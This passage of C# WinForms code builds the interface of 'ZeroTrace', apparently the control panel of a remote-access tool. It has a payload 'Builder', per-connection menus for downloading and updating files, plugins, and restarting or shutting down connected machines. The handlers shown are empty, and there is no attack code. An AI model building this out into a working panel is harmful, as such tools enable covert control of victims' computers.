            pluginManagerNavigationElement = CreateNavigationItem("pluginManagerNavigationElement", "Plugin Manager");
            pluginManagerNavigationElement.Click += delegate { NavigateToSidebarPage(pluginManagerNavigationElement, pluginManagerTabPage); };

            blockedConnectionsNavigationElement = CreateNavigationItem("blockedConnectionsNavigationElement", "Blocked Connections");
            blockedConnectionsNavigationElement.Click += delegate { NavigateToSidebarPage(blockedConnectionsNavigationElement, blockedConnectionsTabPage); };

            systemNavigationGroup = accordionControlElement9;
            systemNavigationGroup.Text = "System";
            systemNavigationGroup.Expanded = true;
            systemNavigationGroup.Elements.Clear();
            systemNavigationGroup.Elements.Add(notificationsNavigationElement);
            systemNavigationGroup.Elements.Add(pluginManagerNavigationElement);

            accordionControlElement1.Elements.Add(blockedConnectionsNavigationElement);
            ConfigureSidebarItemAppearance(systemNavigationGroup);
            ConfigureSidebarItemAppearance(accordionControlElement1);

            ApplySidebarIcons();
        }

        private DevExpress.XtraTab.XtraTabPage CreateBlankNavigationPage(string name, string text)
        {
            DevExpress.XtraTab.XtraTabPage page = new DevExpress.XtraTab.XtraTabPage();
            page.Name = name;
            page.Text = text;
            page.BackColor = ColorTranslator.FromHtml("#262626");
            return page;
        }

        private DevExpress.XtraBars.Navigation.AccordionControlElement CreateNavigationItem(string name, string text)
        {
            DevExpress.XtraBars.Navigation.AccordionControlElement item = new DevExpress.XtraBars.Navigation.AccordionControlElement();
            item.Name = name;
            item.Text = text;
            item.Style = DevExpress.XtraBars.Navigation.ElementStyle.Item;
            return item;
        }

        private int GetCurrentDpi()
        {
            int dpi = DeviceDpi;
            return dpi > 0 ? dpi : 96;
        }

        private static int ScaleLogicalPixels(int logicalPixels, int dpi)
        {
            return Math.Max(1, (int)Math.Round(logicalPixels * dpi / 96.0, MidpointRounding.AwayFromZero));
        }

        private void ApplySidebarLayoutForDpi(int dpi, bool forceExpandedWidth)
        {
            if (accordionControl1 == null)
                return;

            // DevExpress/FluentDesignForm owns the collapsed navigation width. Only
            // impose our 240-logical-pixel target when the rail is expanded; otherwise
            // preserve the control's collapsed state instead of accidentally forcing it
            // back open during a monitor-DPI transition.
            if (forceExpandedWidth)
                accordionControl1.Width = ScaleLogicalPixels(SidebarWidth, dpi);

            accordionControl1.GroupHeight = ScaleLogicalPixels(SidebarGroupHeight, dpi);
            accordionControl1.ItemHeight = ScaleLogicalPixels(SidebarItemHeight, dpi);

            // FluentDesignForm/WinForms docking calculates the fill container's
            // position from the left-docked navigation control. We intentionally do
            // not force an absolute Location here.
            if (fluentDesignFormContainer1 != null && fluentDesignFormContainer1.Dock != DockStyle.Fill)
                fluentDesignFormContainer1.Dock = DockStyle.Fill;
        }

        protected override void OnDpiChanged(DpiChangedEventArgs e)
        {
            base.OnDpiChanged(e);

            int expandedThreshold = ScaleLogicalPixels(200, e.DeviceDpiNew);
            bool navigationIsExpanded = accordionControl1 != null && accordionControl1.Width >= expandedThreshold;
            ApplySidebarLayoutForDpi(e.DeviceDpiNew, navigationIsExpanded);

            // Rebind the small vector navigation icons at the new DPI so their
            // configured SvgImageSize remains crisp instead of bitmap-scaled.
            ApplySidebarIcons();
            Invalidate(true);
        }

        private void ConfigureSidebarAppearance()
        {
            // Keep the accordion itself responsible for its own background.  The
            // hamburger header is a real part of the AccordionControl, so painting
            // the parent control and the header to the same color prevents the skin
            // from exposing a separate black strip above the navigation items.
            accordionControl1.AllowHtmlText = false;
            ApplySidebarLayoutForDpi(GetCurrentDpi(), true);
            accordionControl1.ViewType = DevExpress.XtraBars.Navigation.AccordionControlViewType.Standard;
            accordionControl1.ScrollBarMode = DevExpress.XtraBars.Navigation.ScrollBarMode.Default;
            accordionControl1.BackColor = SidebarBackgroundColor;
            accordionControl1.ForeColor = Color.White;

            accordionControlElement1.Text = "Dashboard";
            accordionControlElement5.Text = "Builder";
            accordionControlElement9.Text = "System";
            accordionControlElement12.Text = "About";

            ConfigureSidebarGroupAppearance(accordionControlElement1);
            ConfigureSidebarGroupAppearance(accordionControlElement5);
            ConfigureSidebarGroupAppearance(accordionControlElement9);
            ConfigureSidebarGroupAppearance(accordionControlElement12);
            ConfigureSidebarItemAppearance(accordionControlElement1);
            ConfigureSidebarItemAppearance(accordionControlElement5);
            ConfigureSidebarItemAppearance(accordionControlElement9);
            ConfigureSidebarItemAppearance(accordionControlElement12);
            ApplySidebarIcons();
        }

        private void ConfigureSidebarGroupAppearance(DevExpress.XtraBars.Navigation.AccordionControlElement group)
        {
            if (group == null) return;
            Font groupFont = new Font("Segoe UI Semibold", 10.0F, FontStyle.Bold, GraphicsUnit.Point);
            group.Appearance.Normal.BackColor = SidebarBackgroundColor;
            group.Appearance.Normal.ForeColor = Color.White;
            group.Appearance.Normal.Font = groupFont;
            group.Appearance.Normal.Options.UseBackColor = true;
            group.Appearance.Normal.Options.UseForeColor = true;
            group.Appearance.Normal.Options.UseFont = true;
            group.Appearance.Hovered.BackColor = SidebarBackgroundColor;
            group.Appearance.Hovered.ForeColor = Color.White;
            group.Appearance.Hovered.Font = groupFont;
            group.Appearance.Hovered.Options.UseBackColor = true;
            group.Appearance.Hovered.Options.UseForeColor = true;
            group.Appearance.Hovered.Options.UseFont = true;
            group.Appearance.Pressed.BackColor = SidebarBackgroundColor;
            group.Appearance.Pressed.ForeColor = Color.White;
            group.Appearance.Pressed.Font = groupFont;
            group.Appearance.Pressed.Options.UseBackColor = true;
            group.Appearance.Pressed.Options.UseForeColor = true;
            group.Appearance.Pressed.Options.UseFont = true;
        }

        private void ConfigureSidebarItemAppearance(DevExpress.XtraBars.Navigation.AccordionControlElement group)
        {
            if (group == null) return;
            foreach (DevExpress.XtraBars.Navigation.AccordionControlElement child in group.Elements)
            {
                if (child == null || child.Style != DevExpress.XtraBars.Navigation.ElementStyle.Item) continue;
                child.Appearance.Normal.ForeColor = SidebarItemTextColor;
                child.Appearance.Normal.Font = new Font("Segoe UI", 9.0F, FontStyle.Regular, GraphicsUnit.Point);
                child.Appearance.Normal.Options.UseForeColor = true;
                child.Appearance.Normal.Options.UseFont = true;
                child.Appearance.Hovered.ForeColor = Color.White;
                child.Appearance.Hovered.Font = new Font("Segoe UI", 9.0F, FontStyle.Regular, GraphicsUnit.Point);
                child.Appearance.Hovered.Options.UseForeColor = true;
                child.Appearance.Hovered.Options.UseFont = true;
                child.Appearance.Pressed.ForeColor = Color.White;
                child.Appearance.Pressed.Font = new Font("Segoe UI", 9.0F, FontStyle.Regular, GraphicsUnit.Point);
                child.Appearance.Pressed.Options.UseForeColor = true;
                child.Appearance.Pressed.Options.UseFont = true;
            }
        }

        private void AccordionControl1_CustomDrawElement(object sender, DevExpress.XtraBars.Navigation.CustomDrawElementEventArgs e)
        {
            if (e == null || e.Element == null)
                return;

            Rectangle header = e.ObjectInfo.HeaderBounds;
            int lineLeft = ScaleLogicalPixels(SidebarMenuHorizontalInset, GetCurrentDpi());
            int lineRight = Math.Max(lineLeft + 24, accordionControl1.ClientSize.Width - ScaleLogicalPixels(SidebarContentRightPadding, GetCurrentDpi()));
            int lineY = header.Bottom - 7;

            if (e.Element.Style == DevExpress.XtraBars.Navigation.ElementStyle.Group)
            {
                e.Handled = true;
                e.DrawHeaderBackground();
                e.ObjectInfo.PaintAppearance.ForeColor = Color.White;
                e.ObjectInfo.PaintAppearance.Font = new Font("Segoe UI Semibold", 10.0F, FontStyle.Bold, GraphicsUnit.Point);
                e.ObjectInfo.PaintAppearance.Options.UseForeColor = true;
                e.ObjectInfo.PaintAppearance.Options.UseFont = true;
                e.DrawImage();
                e.DrawText();
                e.DrawExpandCollapseButton();

                // Keep the rule and selected surface clear of the group's native
                // expand/collapse button at the far right. The item hit-test area
                // remains full-width; only the painted surface is inset.
                using (Pen pen = new Pen(Color.FromArgb(106, 108, 108), 1f))
                    e.Cache.DrawLine(pen, new Point(lineLeft, lineY), new Point(lineRight, lineY));
                return;
            }

            if (e.Element.Style == DevExpress.XtraBars.Navigation.ElementStyle.Item)
            {
                // Fully own the item surface so the Fluent skin cannot paint its native
                // hover/shadow adorner across the entire AccordionControl width. The
                // hover/selected surface is deliberately clipped to the same horizontal
                // bounds used by the category divider lines.
                e.Handled = true;

                Rectangle itemBounds = new Rectangle(
                    lineLeft,
                    header.Top,
                    Math.Max(0, lineRight - lineLeft),
                    header.Height);

                Point cursor = accordionControl1.PointToClient(Control.MousePosition);
                bool isHovered = header.Contains(cursor);
                bool isSelected = e.Element == accordionControl1.SelectedElement;

                if (isSelected)
                {
                    e.Cache.FillRectangle(SidebarAccentColor, itemBounds);
                }
                else if (isHovered)
                {
                    // Subtle in-bounds hover tint; no native shadow is allowed to escape
                    // the same right edge as the category divider.
                    e.Cache.FillRectangle(Color.FromArgb(57, 55, 56), itemBounds);
                }
                else
                {
                    e.Cache.FillRectangle(SidebarBackgroundColor, itemBounds);
                }

                e.ObjectInfo.PaintAppearance.ForeColor = Color.White;
                e.ObjectInfo.PaintAppearance.Font = new Font("Segoe UI", 9.0F, FontStyle.Regular, GraphicsUnit.Point);
                e.ObjectInfo.PaintAppearance.Options.UseForeColor = true;
                e.ObjectInfo.PaintAppearance.Options.UseFont = true;
                e.DrawImage();
                e.DrawText();
                return;
            }
        }

        private void ApplySidebarIcons()
        {
            DisposeSidebarIcons();
            AssignSidebarIcon(accordionControlElement1, "sidebar_dashboard.svg");
            AssignSidebarIcon(accordionControlElement2, "sidebar_connections.svg");
            AssignSidebarIcon(accordionControlElement3, "sidebar_server.svg");
            AssignSidebarIcon(accordionControlElement6, "sidebar_build.svg");
            AssignSidebarIcon(accordionControlElement7, "sidebar_convert.svg");
            AssignSidebarIcon(accordionControlElement5, "sidebar_builder.svg");
            AssignSidebarIcon(accordionControlElement9, "sidebar_system.svg");
            AssignSidebarIcon(notificationsNavigationElement, "sidebar_notifications.svg");
            AssignSidebarIcon(pluginManagerNavigationElement, "sidebar_plugin_manager.svg");
            AssignSidebarIcon(blockedConnectionsNavigationElement, "sidebar_blocked.svg");
            AssignSidebarIcon(accordionControlElement12, "sidebar_about.svg");
            AssignSidebarIcon(accordionControlElement13, "sidebar_about_user.svg");
        }

        private void AssignSidebarIcon(DevExpress.XtraBars.Navigation.AccordionControlElement element, string fileName)
        {
            if (element == null) return;
            SvgImage image = LoadUiSvgImage(fileName);
            sidebarIconImages.Add(image);
            element.ImageOptions.Image = null;
            element.ImageOptions.SvgImage = image;
            element.ImageOptions.SvgImageSize = new Size(
                ScaleLogicalPixels(SidebarIconSize, GetCurrentDpi()),
                ScaleLogicalPixels(SidebarIconSize, GetCurrentDpi()));
            element.ImageOptions.SvgImageColorizationMode = DevExpress.Utils.SvgImageColorizationMode.None;
        }

        private static string GetUiIconPath(string fileName)
        {
            return Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Resources", "icons", fileName);
        }

        private static SvgImage LoadUiSvgImage(string fileName)
        {
            string path = GetUiIconPath(fileName);
            if (!File.Exists(path))
                throw new FileNotFoundException("Required ZeroTrace UI icon was not deployed.", path);

            using (FileStream stream = File.OpenRead(path))
                return SvgImage.FromStream(stream);
        }

        private static void DisposeSvgImages(List<SvgImage> images)
        {
            foreach (SvgImage image in images)
            {
                IDisposable disposable = image as IDisposable;
                if (disposable != null)
                    disposable.Dispose();
            }
            images.Clear();
        }

        private void DisposeSidebarIcons()
        {
            DisposeSvgImages(sidebarIconImages);
        }

        private void DisposeUiIconImages()
        {
            DisposeSidebarIcons();
            DisposeSvgImages(connectionMenuIconImages);
        }

        private void xtraTabControl1_SelectedPageChanged(object sender, DevExpress.XtraTab.TabPageChangedEventArgs e)
        {
            if (e == null || e.Page == null) return;
            DevExpress.XtraBars.Navigation.AccordionControlElement item = null;
            if (e.Page == xtraTabPage1) item = accordionControlElement2;
            else if (e.Page == xtraTabPage2) item = accordionControlElement3;
            else if (e.Page == autoTasksTabPage) item = autoTasksNavigationElement;
            else if (e.Page == notificationsTabPage) item = notificationsNavigationElement;
            else if (e.Page == pluginManagerTabPage) item = pluginManagerNavigationElement;
            else if (e.Page == blockedConnectionsTabPage) item = blockedConnectionsNavigationElement;
            else if (e.Page == xtraTabPage4) item = null;
            else if (e.Page == xtraTabPage5) item = accordionControlElement6;
            else if (e.Page == xtraTabPage6) item = accordionControlElement7;
            else if (e.Page == xtraTabPage9) item = accordionControlElement13;
            if (item != null) accordionControl1.SelectedElement = item;
        }

        private void NavigateToSidebarPage(DevExpress.XtraBars.Navigation.AccordionControlElement element, DevExpress.XtraTab.XtraTabPage page)
        {
            if (page == null) return;
            xtraTabControl1.SelectedTabPage = page;
            accordionControl1.SelectedElement = element;
        }

        private void autoTasksNavigationElement_Click(object sender, EventArgs e)
        {
            NavigateToSidebarPage(autoTasksNavigationElement, autoTasksTabPage);
        }

        private void notificationsNavigationElement_Click(object sender, EventArgs e)
        {
            NavigateToSidebarPage(notificationsNavigationElement, notificationsTabPage);
        }

        private void InitializeConnectionsContextMenu()
        {
            connectionsContextMenu = new ContextMenuStrip
            {
                Name = "connectionsContextMenu",
                ShowImageMargin = false,
                ShowCheckMargin = false,
                AutoClose = true,
                BackColor = Color.FromArgb(26, 26, 26),
                ForeColor = Color.White,
                Font = new Font("Tahoma", 9.75F, FontStyle.Regular, GraphicsUnit.Point)
            };

            connectionsPopupMenu = new DevExpress.XtraBars.PopupMenu(fluentFormDefaultManager1)
            {
                Name = "connectionsPopupMenu",
                MinWidth = ContextParentMenuWidth,
                MenuDrawMode = DevExpress.XtraBars.MenuDrawMode.SmallImagesText
            };

            ConfigureConnectionMenuItems();
            connectionsContextMenu.Opening += connectionsContextMenu_Opening;
            ApplyContextMenuToControlTree(xtraTabPage1, connectionsContextMenu);
            gridControl1.ContextMenuStrip = connectionsContextMenu;
        }

        private DevExpress.XtraBars.BarButtonItem CreateConnectionMenuItem(string text, EventHandler clickHandler)
        {
            DevExpress.XtraBars.BarButtonItem item = new DevExpress.XtraBars.BarButtonItem(fluentFormDefaultManager1, text);
            item.ImageOptions.Image = null;
            item.ImageOptions.SvgImage = null;
            if (clickHandler != null) item.ItemClick += delegate { clickHandler(item, EventArgs.Empty); };
            return item;
        }

        private DevExpress.XtraBars.BarSubItem CreateConnectionMenuGroup(string text, string iconFileName)
        {
            DevExpress.XtraBars.BarSubItem item = new DevExpress.XtraBars.BarSubItem(fluentFormDefaultManager1, text);
            item.PopupMinWidth = ContextMenuWidth;
            SvgImage icon = LoadUiSvgImage(iconFileName);
            connectionMenuIconImages.Add(icon);
            item.ImageOptions.Image = null;
            item.ImageOptions.SvgImage = icon;
            item.ImageOptions.SvgImageSize = new Size(16, 16);
            item.ImageOptions.SvgImageColorizationMode = DevExpress.Utils.SvgImageColorizationMode.None;
            return item;
        }

        private void ConfigureConnectionMenuItems()
        {
            connectionsPopupMenu.ItemLinks.Clear();
            DisposeConnectionMenuIcons();

            connectionsAdministrationMenu = CreateConnectionMenuGroup("Administration", "menu_administration.svg");
            connectionsDownloadOneItem = CreateConnectionMenuItem("Download [ One ]", delegate { ShowAdministrationDialog("Download [ One ]"); });
            connectionsDownloadTwoItem = CreateConnectionMenuItem("Download [ Two ]", delegate { ShowAdministrationDialog("Download [ Two ]"); });
            connectionsDownloadUpdateItem = CreateConnectionMenuItem("Download and Update", delegate { ShowAdministrationDialog("Download and Update"); });
            connectionsAdministrationMenu.AddItem(connectionsDownloadOneItem);
            connectionsAdministrationMenu.AddItem(connectionsDownloadTwoItem);
            connectionsAdministrationMenu.AddItem(connectionsDownloadUpdateItem);

            connectionsNetworkingMenu = CreateConnectionMenuGroup("Networking", "menu_networking.svg");
            connectionsNetworkingMenu.AddItem(CreateConnectionMenuItem("Restart Connection", delegate { }));
            connectionsCloseItem = CreateConnectionMenuItem("Close Connection", delegate { ShowConnectionConfirmation("Close Connection"); });
            connectionsBlockItem = CreateConnectionMenuItem("Block Connection", delegate { ShowConnectionConfirmation("Block Connection"); });
            connectionsNetworkingMenu.AddItem(connectionsCloseItem);
            connectionsNetworkingMenu.AddItem(connectionsBlockItem);

            connectionsPluginsMenu = CreateConnectionMenuGroup("Plugins", "menu_plugins.svg");
            connectionsExPlugin1Item = CreateConnectionMenuItem("ExPlugin 1", delegate { });
            connectionsExPlugin2Item = CreateConnectionMenuItem("ExPlugin 2", delegate { });
            connectionsExPlugin3Item = CreateConnectionMenuItem("ExPlugin 3", delegate { });
            connectionsPluginsMenu.AddItem(connectionsExPlugin1Item);
            connectionsPluginsMenu.AddItem(connectionsExPlugin2Item);
            connectionsPluginsMenu.AddItem(connectionsExPlugin3Item);

            connectionsManagementMenu = CreateConnectionMenuGroup("Management", "menu_management.svg");
            connectionsSleepItem = CreateConnectionMenuItem("Sleep", delegate { });
            connectionsHibernateItem = CreateConnectionMenuItem("Hibernate", delegate { });
            connectionsRestartItem = CreateConnectionMenuItem("Restart", delegate { });
            connectionsShutdownItem = CreateConnectionMenuItem("Shutdown", delegate { });
            connectionsManagementMenu.AddItem(connectionsSleepItem);
            connectionsManagementMenu.AddItem(connectionsHibernateItem);
            connectionsManagementMenu.AddItem(connectionsRestartItem);
            connectionsManagementMenu.AddItem(connectionsShutdownItem);

            connectionsPopupMenu.AddItem(connectionsAdministrationMenu);
            connectionsPopupMenu.AddItem(connectionsNetworkingMenu);
            connectionsPopupMenu.AddItem(connectionsPluginsMenu);
            connectionsPopupMenu.AddItem(connectionsManagementMenu);

        }

        private void DisposeConnectionMenuIcons()
        {
            DisposeSvgImages(connectionMenuIconImages);
        }

        private void ShowConnectionConfirmation(string action)
        {
            MessageBox.Show(
                "Are you sure you want to " + action.ToLowerInvariant() + "?",
                action,
                MessageBoxButtons.OKCancel,
                MessageBoxIcon.Warning,
                MessageBoxDefaultButton.Button2);
        }

        private void ShowAdministrationDialog(string selectedAction)
        {
            const int DialogWidth = 620;
            const int DialogHeight = 344;
            Color window = Color.FromArgb(35, 37, 38);
            Color titleBar = Color.FromArgb(29, 31, 32);
            Color surface = Color.FromArgb(43, 45, 46);
            Color field = Color.FromArgb(31, 33, 34);
            Color border = Color.FromArgb(70, 74, 74);
            Color text = Color.FromArgb(239, 242, 241);
            Color muted = Color.FromArgb(164, 171, 168);
            Color accent = SidebarAccentColor;

            using (Form dialog = new Form())
            {
                dialog.Name = "AdministrationDialog";
                dialog.Text = "Administration";
                dialog.StartPosition = FormStartPosition.Manual;
                dialog.FormBorderStyle = FormBorderStyle.None;
                dialog.MinimizeBox = false;
                dialog.MaximizeBox = false;
                dialog.ShowInTaskbar = false;
                dialog.ClientSize = new Size(DialogWidth, DialogHeight);
                dialog.BackColor = window;
                dialog.ForeColor = text;
                dialog.Font = new Font("Segoe UI", 9F, FontStyle.Regular, GraphicsUnit.Point);
                dialog.KeyPreview = true;

                using (System.Drawing.Drawing2D.GraphicsPath path = CreateRoundedRectanglePath(new Rectangle(0, 0, DialogWidth, DialogHeight), 12))
                    dialog.Region = new Region(path);

                Panel titlePanel = new Panel
                {
                    Dock = DockStyle.Top,
                    Height = 58,
                    BackColor = titleBar
                };
                titlePanel.Paint += delegate(object sender, PaintEventArgs args)
                {
                    using (Pen accentPen = new Pen(accent, 1.5f))
                        args.Graphics.DrawLine(accentPen, new Point(0, 0), new Point(0, titlePanel.Height));
                };
                Label title = new Label
                {
                    Text = "Administration",
                    AutoSize = true,
                    Font = new Font("Segoe UI Semibold", 12.5F, FontStyle.Bold, GraphicsUnit.Point),
                    ForeColor = text,
                    Location = new Point(22, 15)
                };
                Label close = new Label
                {
                    AutoSize = false,
                    Size = new Size(46, 46),
                    Text = "×",
                    TextAlign = ContentAlignment.MiddleCenter,
                    Font = new Font("Segoe UI Light", 19F, FontStyle.Regular, GraphicsUnit.Point),
                    ForeColor = muted,
                    Cursor = Cursors.Hand,
                    Anchor = AnchorStyles.Top | AnchorStyles.Right,
                    Location = new Point(DialogWidth - 55, 8)
                };
                close.MouseEnter += delegate { close.ForeColor = text; close.BackColor = Color.FromArgb(55, 58, 58); };
                close.MouseLeave += delegate { close.ForeColor = muted; close.BackColor = Color.Transparent; };
                close.Click += delegate { dialog.DialogResult = DialogResult.Cancel; dialog.Close(); };

                titlePanel.Controls.Add(title);
                titlePanel.Controls.Add(close);

                // The custom title bar also provides natural mouse dragging.
                Point dragOffset = Point.Empty;
                titlePanel.MouseDown += delegate(object sender, MouseEventArgs args)
                {
                    if (args.Button == MouseButtons.Left) dragOffset = args.Location;
                };
                titlePanel.MouseMove += delegate(object sender, MouseEventArgs args)
                {
                    if (args.Button == MouseButtons.Left)
                    {
                        Point cursor = Cursor.Position;
                        dialog.Location = new Point(cursor.X - dragOffset.X - titlePanel.Left, cursor.Y - dragOffset.Y - titlePanel.Top);
                    }
                };

                Label fileLabel = new Label
                {
                    Text = "File",
                    AutoSize = true,
                    Font = new Font("Segoe UI Semibold", 9F, FontStyle.Bold, GraphicsUnit.Point),
                    ForeColor = text,
                    Location = new Point(28, 78)
                };
                Label fileHint = new Label
                {
                    Text = "Select the local file to use for this administration action.",
                    AutoSize = true,
                    Font = new Font("Segoe UI", 8.25F, FontStyle.Regular, GraphicsUnit.Point),
                    ForeColor = muted,
                    Location = new Point(28, 97)
                };

                Panel filePanel = new Panel
                {
                    Location = new Point(28, 124),
                    Size = new Size(564, 44),
                    BackColor = field
                };
                filePanel.Paint += delegate(object sender, PaintEventArgs args)
                {
                    using (Pen pen = new Pen(border, 1))
                        args.Graphics.DrawRectangle(pen, 0, 0, filePanel.Width - 1, filePanel.Height - 1);
                };
                TextBox filePath = new TextBox
                {
                    BorderStyle = BorderStyle.None,
                    Location = new Point(13, 12),
                    Width = 400,
                    Height = 20,
                    ReadOnly = true,
                    BackColor = field,
                    ForeColor = text,
                    Font = new Font("Segoe UI", 9F, FontStyle.Regular, GraphicsUnit.Point),
                    TabStop = false
                };
                Button browse = new Button
                {
                    Text = "Browse",
                    FlatStyle = FlatStyle.Flat,
                    Location = new Point(457, 6),
                    Size = new Size(98, 32),
                    BackColor = Color.FromArgb(49, 50, 51),
                    ForeColor = Color.White,
                    Font = new Font("Segoe UI Semibold", 8.75F, FontStyle.Bold, GraphicsUnit.Point),
                    Cursor = Cursors.Hand
                };
                browse.FlatAppearance.BorderColor = Color.FromArgb(93, 99, 99);
                browse.FlatAppearance.MouseOverBackColor = Color.FromArgb(58, 61, 62);
                browse.FlatAppearance.MouseDownBackColor = Color.FromArgb(64, 67, 68);
                browse.Click += delegate
                {
                    using (OpenFileDialog chooser = new OpenFileDialog { Title = "Select a file", CheckFileExists = true, Multiselect = false })
                    {
                        if (chooser.ShowDialog(dialog) == DialogResult.OK) filePath.Text = chooser.FileName;
                    }
                };
                filePanel.Controls.Add(filePath);
                filePanel.Controls.Add(browse);

                Label actionLabel = new Label
                {
                    Text = "Administration action",
                    AutoSize = true,
                    Font = new Font("Segoe UI Semibold", 9F, FontStyle.Bold, GraphicsUnit.Point),
                    ForeColor = text,
                    Location = new Point(28, 186)
                };
                Label actionHint = new Label
                {
                    Text = "Select one option. The highlighted choice is the one submitted by OK.",
                    AutoSize = true,
                    Font = new Font("Segoe UI", 8.25F, FontStyle.Regular, GraphicsUnit.Point),
                    ForeColor = muted,
                    Location = new Point(28, 205)
                };

                RadioButton one = CreateAdministrationRadio("Download [ One ]", new Point(28, 235), surface, border, accent, text);
                RadioButton two = CreateAdministrationRadio("Download [ Two ]", new Point(218, 235), surface, border, accent, text);
                RadioButton update = CreateAdministrationRadio("Download and Update", new Point(408, 235), surface, border, accent, text);
                one.Checked = selectedAction == "Download [ One ]";
                two.Checked = selectedAction == "Download [ Two ]";
                update.Checked = selectedAction == "Download and Update";

                Button cancel = new Button
                {
                    Text = "Cancel",
                    DialogResult = DialogResult.Cancel,
                    FlatStyle = FlatStyle.Flat,
                    Location = new Point(404, 294),
                    Size = new Size(88, 34),
                    BackColor = Color.FromArgb(48, 50, 51),
                    ForeColor = text,
                    Font = new Font("Segoe UI Semibold", 9F, FontStyle.Bold, GraphicsUnit.Point),
                    Cursor = Cursors.Hand
                };
                cancel.FlatAppearance.BorderColor = border;
                cancel.FlatAppearance.MouseOverBackColor = Color.FromArgb(57, 60, 60);
                cancel.FlatAppearance.MouseDownBackColor = Color.FromArgb(64, 67, 67);

                Button ok = new Button
                {
                    Text = "OK",
                    FlatStyle = FlatStyle.Flat,
                    Location = new Point(502, 294),
                    Size = new Size(90, 34),
                    BackColor = accent,
                    ForeColor = Color.White,
                    Font = new Font("Segoe UI Semibold", 9F, FontStyle.Bold, GraphicsUnit.Point),
                    Cursor = Cursors.Hand
                };
                ok.FlatAppearance.BorderSize = 0;
                ok.FlatAppearance.MouseOverBackColor = accent;
                ok.FlatAppearance.MouseDownBackColor = accent;
                ok.Click += delegate { /* Intentionally a no-op for now. */ };

                dialog.AcceptButton = ok;
                dialog.CancelButton = cancel;
                dialog.Controls.Add(titlePanel);
                dialog.Controls.Add(fileLabel);
                dialog.Controls.Add(fileHint);
                dialog.Controls.Add(filePanel);
                dialog.Controls.Add(actionLabel);
                dialog.Controls.Add(actionHint);
                dialog.Controls.Add(one);
                dialog.Controls.Add(two);
                dialog.Controls.Add(update);
                dialog.Controls.Add(cancel);
                dialog.Controls.Add(ok);

                // Center the modal over the complete main GUI client area (including
                // the sidebar). This keeps the dialog visually attached to its owner
                // while remaining correct when the owner sits on any monitor.
                Rectangle ownerClient = RectangleToScreen(ClientRectangle);
                int dialogX = ownerClient.Left + Math.Max(0, (ownerClient.Width - DialogWidth) / 2);
                int dialogY = ownerClient.Top + Math.Max(0, (ownerClient.Height - DialogHeight) / 2);
                dialog.Location = new Point(dialogX, dialogY);

                if (string.Equals(Environment.GetEnvironmentVariable("ZTSEC_CI_SMOKE"), "1", StringComparison.Ordinal))
                {
                    dialog.Shown += delegate
                    {
                        try
                        {
                            string markerPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "ci-administration-dialog-opened.flag");
                            File.WriteAllText(markerPath,
                                "OPENED|" + DateTime.UtcNow.ToString("O") + "|Administration|" + selectedAction + "|DownloadOneChecked=" + one.Checked.ToString());
                        }
                        catch (Exception ex)
                        {
                            LogToMonitor("CI administration dialog verification failed: " + ex.Message, LogType.Error);
                        }
                    };
                }

                dialog.ShowDialog(this);
            }
        }

        private static RadioButton CreateAdministrationRadio(string caption, Point location, Color background, Color border, Color accent, Color text)
        {
            RadioButton radio = new RadioButton
            {
                Text = string.Empty,
                Tag = caption,
                Location = location,
                Size = new Size(174, 45),
                BackColor = background,
                ForeColor = text,
                Font = new Font("Segoe UI", 8.75F, FontStyle.Regular, GraphicsUnit.Point),
                FlatStyle = FlatStyle.Flat,
                Appearance = System.Windows.Forms.Appearance.Normal,
                Cursor = Cursors.Hand,
                UseVisualStyleBackColor = false
            };
            radio.FlatAppearance.BorderSize = 0;
            radio.Paint += delegate(object sender, PaintEventArgs e)
            {
                RadioButton rb = (RadioButton)sender;
                e.Graphics.SmoothingMode = System.Drawing.Drawing2D.SmoothingMode.AntiAlias;
                using (SolidBrush bg = new SolidBrush(rb.BackColor))
                    e.Graphics.FillRectangle(bg, rb.ClientRectangle);

                int dotCenterX = 14;
                int dotCenterY = rb.ClientSize.Height / 2;
                Rectangle ring = new Rectangle(dotCenterX - 8, dotCenterY - 8, 16, 16);
                using (Pen ringPen = new Pen(Color.FromArgb(195, 201, 198), 1.4f))
                    e.Graphics.DrawEllipse(ringPen, ring);
                if (rb.Checked)
                {
                    using (SolidBrush dotBrush = new SolidBrush(accent))
                        e.Graphics.FillEllipse(dotBrush, new Rectangle(dotCenterX - 4, dotCenterY - 4, 8, 8));
                }

                string label = Convert.ToString(rb.Tag);
                using (SolidBrush textBrush = new SolidBrush(rb.ForeColor))
                    e.Graphics.DrawString(label, rb.Font, textBrush, new PointF(29, dotCenterY - rb.Font.Height / 2f + 1));
            };
            radio.CheckedChanged += delegate { radio.Invalidate(); };
            radio.MouseEnter += delegate { radio.BackColor = Color.FromArgb(49, 51, 52); radio.Invalidate(); };
            radio.MouseLeave += delegate { radio.BackColor = background; radio.Invalidate(); };
            return radio;
        }

        private static System.Drawing.Drawing2D.GraphicsPath CreateRoundedRectanglePath(Rectangle bounds, int radius)
        {
            int diameter = radius * 2;
            System.Drawing.Drawing2D.GraphicsPath path = new System.Drawing.Drawing2D.GraphicsPath();
            path.AddArc(bounds.Left, bounds.Top, diameter, diameter, 180, 90);
            path.AddArc(bounds.Right - diameter, bounds.Top, diameter, diameter, 270, 90);
            path.AddArc(bounds.Right - diameter, bounds.Bottom - diameter, diameter, diameter, 0, 90);
            path.AddArc(bounds.Left, bounds.Bottom - diameter, diameter, diameter, 90, 90);
            path.CloseFigure();
            return path;
        }

        private static void ApplyContextMenuToControlTree(Control root, ContextMenuStrip menu)
        {
            if (root == null || menu == null)
                return;

            root.ContextMenuStrip = menu;
            foreach (Control child in root.Controls)
                ApplyContextMenuToControlTree(child, menu);
        }

        private void connectionsContextMenu_Opening(object sender, System.ComponentModel.CancelEventArgs e)
        {
            contextMenuRowHandle = -1;
            contextMenuFieldName = string.Empty;

            Control source = connectionsContextMenu.SourceControl;
            if (source != null && IsDescendantOf(source, gridControl1))
            {
                Point clientPoint = gridControl1.PointToClient(Control.MousePosition);
                DevExpress.XtraGrid.Views.Grid.ViewInfo.GridHitInfo hitInfo =
                    gridView.CalcHitInfo(clientPoint);

                if (hitInfo.InRow && hitInfo.RowHandle >= 0)
                {
                    contextMenuRowHandle = hitInfo.RowHandle;
                    contextMenuFieldName = hitInfo.Column != null ? hitInfo.Column.FieldName : string.Empty;

                    // Right-click selects the row under the cursor. Preserve an
                    // existing multi-selection when right-clicking inside it.
                    if (!gridView.IsRowSelected(hitInfo.RowHandle))
                    {
                        gridView.ClearSelection();
                        gridView.SelectRow(hitInfo.RowHandle);
                    }
                    gridView.FocusedRowHandle = hitInfo.RowHandle;
